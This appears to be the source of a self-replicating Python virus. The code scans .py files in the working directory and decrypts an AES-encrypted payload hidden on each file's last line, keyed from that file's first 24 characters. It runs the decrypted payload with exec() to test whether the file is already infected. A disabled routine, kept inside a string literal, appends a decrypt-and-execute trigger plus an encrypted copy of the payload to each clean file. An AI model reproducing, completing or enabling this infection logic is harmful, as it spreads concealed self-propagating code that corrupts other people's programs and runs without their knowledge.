try:
	test_phase
except:

	infected = False
	#print("not infected")

	def get_iv() :
		return Random.new().read(AES.block_size)

	def get_cipher(key, iv) :
		return AES.new(key, AES.MODE_CFB, iv)

	def get_key(f) :
		target = open(f, 'r')
		key = StringIO(target.read()).read(24)
		target.close()
		if len(key) < 24 :
			return -1

		return key

	def get_payload_encrypted(f) :
		target = open(f, 'r')
		lines = target.readlines()
		target.close()
		if len(lines) > 0 :
			return lines[-1][1:]
		
		return -1

	def decrypt_payload(p, key) :
		if(p == -1) :
			return -1

		try :
			p = base64.b64decode(p);
		except :
			return -2

		return get_cipher(key, get_iv()).decrypt(p)[16:]

	def encrypt_payload(p, key):

	   iv = get_iv()

	   encrypted = iv + get_cipher(key, iv).encrypt(p)

	   p = base64.b64encode(encrypted)

	   return str(p, 'utf-8')

	def test_file(f):
		print('test ', f)
		payload = get_payload_encrypted(f)
		key = get_key(f)
		if key == -1 :
			print('\tEmpty file (key)')
			return True

		payload = decrypt_payload(payload, key)
		if payload == -1 :
			print('\tEmpty file')
			return True
		elif payload == -2 :
			return False

		test_phase = True
		infected = False

		try :
			exec(payload)
			#print('\t', infected)
		except :
			print('\texecution failed')
			return False

		test_phase = False

		if infected :
			print('\tinfected')
			infected = False
			return True
		else :
			print('\tnot infected')
			return False

	





	files = [f for f in os.listdir() if os.path.isfile(f) and f.endswith('.py') and (not test_file(f))]

	print('files : ', files)
	"""
	for f in files:

		print('target: ' + f)

		print('\tNOT Infected')

		trigger = "\nimport base64, sys, os, __main__; from Crypto import Random; from Crypto.Cipher import AES; from io import StringIO\n" + "e = AES.new(StringIO(open(__main__.__file__, 'r').read()).read(24), AES.MODE_CFB, Random.new().read(AES.block_size)).decrypt(base64.b64decode(open(__main__.__file__, 'r').readlines()[-1][1:]))[16:]\n" + "exec(e)\n"
		
		print('infect ' + f)

		key = get_key(f)

		target = open(f, 'a')

		target.write(trigger)
		target.write("#" + encrypt_payload(e, key))

		target.flush()
		target.close()
	"""
else:
	if test_phase :
		print("\ttest phase set")
		print('\t', infected)
		infected = True
		
	#else :
	#	print("not infected (test_phase set)")
